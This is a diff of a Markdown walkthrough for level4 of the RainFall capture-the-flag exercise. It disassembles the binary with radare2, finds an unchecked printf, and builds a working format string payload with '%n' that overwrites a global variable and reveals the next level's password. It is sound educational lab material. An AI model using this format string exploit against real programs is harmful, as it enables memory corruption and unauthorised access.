@@ -1,40 +1,19 @@
-The previous method will be too long
+# Level4
 
-There is a trick with the modifier "%d", "%XXXd" will get an XXX size int
-
-We can generate our number of bytes like that
-
-$ python -c 'print "\x10\x98\x04\x08"+"%16930112d%12$n"' | ./level4
-
+As in level3, we can find an executable waiting for an input, print it and quit after press enter
 ```
-[~]$ r2 level4
- -- Run a command with unspecified long sequence of 'a', pancake will be summoned and do the analysis for you.
-[0x08048390]> pxc
-- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF  comment
-0x08048390  31ed 5e89 e183 e4f0 5054 5268 3085 0408  1.^.....PTRh0...  ; eip  ; [13] -r-x section size 476 named .text
-0x080483a0  68c0 8404 0851 5668 a784 0408 e8cf ffff  h....QVh........
-0x080483b0  fff4 9090 9090 9090 9090 9090 9090 9090  ................
-0x080483c0  5589 e553 83ec 0480 3d08 9804 0800 753f  U..S....=.....u?  ; sym.__do_global_dtors_aux
-0x080483d0  a10c 9804 08bb 0897 0408 81eb 0497 0408  ................
-0x080483e0  c1fb 0283 eb01 39d8 731e 8db6 0000 0000  ......9.s.......
-0x080483f0  83c0 01a3 0c98 0408 ff14 8504 9704 08a1  ................
-0x08048400  0c98 0408 39d8 72e8 c605 0898 0408 0183  ....9.r.........
-0x08048410  c404 5b5d c38d 7426 008d bc27 0000 0000  ..[]..t&...'....
-0x08048420  5589 e583 ec18 a10c 9704 0885 c074 12b8  U............t..  ; sym.frame_dummy
-0x08048430  0000 0000 85c0 7409 c704 240c 9704 08ff  ......t...$.....
-0x08048440  d0c9 c390 5589 e583 ec18 8b45 0889 0424  ....U......E...$  ; sym.p
-0x08048450  e8eb feff ffc9 c355 89e5 81ec 1802 0000  .......U........  ; sym.n
-0x08048460  a104 9804 0889 4424 08c7 4424 0400 0200  ......D$..D$....
-0x08048470  008d 85f8 fdff ff89 0424 e8d1 feff ff8d  .........$......
-0x08048480  85f8 fdff ff89 0424 e8b7 ffff ffa1 1098  .......$........
-[0x08048390]> aaa
-[x] Analyze all flags starting with sym. and entry0 (aa)
-[x] Analyze function calls (aac)
-[x] Analyze len bytes of instructions for references (aar)
-[x] Check for vtables
-[x] Type matching analysis for all functions (aaft)       
-[x] Propagate noreturn information
-[x] Use -AA or aaaa to perform additional experimental analysis.
+level4@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
+level4@RainFall:~$ ./level4
+bla
+bla
+level4@RainFall:~$
+```
+After analyze it with radare2 (please refer to [level1](https://github.com/maxisimo/42-RainFall/blob/main/level1/walkthrough.md) if you want more details on the steps to follow)  
+We can see that the `main()` function call a function named `n()` who also call a function named `p()`.  
+- main() :
+```
 [0x08048390]> s main
 [0x080484a7]> pdda
     ; assembly                               | /* r2dec pseudo code output */
@@ -49,6 +28,10 @@ $ python -c 'print "\x10\x98\x04\x08"+"%16930112d%12$n"' | ./level4
     0x080484b2 leave                         |
     0x080484b3 ret                           |
                                              | }
+[0x080484a7]>
+```
+- n() :
+```
 [0x080484a7]> s sym.n
 [0x08048457]> pdda
     ; assembly                                   | /* r2dec pseudo code output */
@@ -81,6 +64,10 @@ $ python -c 'print "\x10\x98\x04\x08"+"%16930112d%12$n"' | ./level4
     0x080484a5 leave                             |
     0x080484a6 ret                               |     return eax;
                                                  | }
+[0x08048457]>
+```
+- p() :
+```
 [0x08048457]> s sym.p
 [0x08048444]> pdda
     ; assembly                                   | /* r2dec pseudo code output */
@@ -99,3 +86,44 @@ $ python -c 'print "\x10\x98\x04\x08"+"%16930112d%12$n"' | ./level4
                                                  | }
 [0x08048444]>
 ```
+The `main()` only call `n()`, not very interesting so we can skip it.  
+We can see a call to `fgets()`, in `n()`, wich is protect against buffer overflow attack.
+```
+    0x0804847a call 0x8048350                    |     fgets (ebp);
+```
+After that we can see a call to `printf()` function, in `p()` wich is vulnerable to format string exploit!
+```
+    0x08048450 call 0x8048340                    |     printf (eax);
+```
+Then the program compares the value of a global variable `m` at `0x8049810` to 0x1025544 (16930116 in dec).  
+If the comparaison return true then the function will launch a shell via a call to `system()`.  
+We need to manipulate `printf()` function into changing the value of the variable at the address `0x8049810`.   
+First, as in [level2](https://github.com/maxisimo/42-RainFall/blob/main/level2/walkthrough.md) we need to print the memory until we reach the address of the variable we wish to modify, then change the content of the variable `m`.
+```
+level4@RainFall:~$ python -c 'print "aaaa" + " %x" * 10' > /tmp/exploit
+level4@RainFall:~$ cat /tmp/exploit | ./level4
+aaaa b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0
+level4@RainFall:~$ python -c 'print "aaaa" + " %x" * 15' > /tmp/exploit
+level4@RainFall:~$ cat /tmp/exploit | ./level4
+aaaa b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078
+level4@RainFall:~$
+```
+The buffer `aaaa` is at the 12th position (`61616161`) !  
+The previous method can't work, cause the value `16930116` in the comparaison is too long. But with the modifier `%d`, we can dynamically specify the field width (like that : `%16930116d`).  
+This will be the only difference between this level and the older one.  
+Finally our final format string attack will look like :  
+- address of `m` (4 bytes)
+- pad of 16930112 (sub 4 bytes cause of `m`) with modifier `%d` + modifier `%n`
+```
+level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit
+level4@RainFall:~$ cat /tmp/exploit | ./level4
+                                                                                     -1208015184
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+level4@RainFall:~$ su level5
+Password:
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
+level5@RainFall:~$
+```
+*For this level we didn't have to keep listening `stdin` cause the `system()` function made a "/bin/cat /home/user/level5/.pass"*
+Level4 passed!
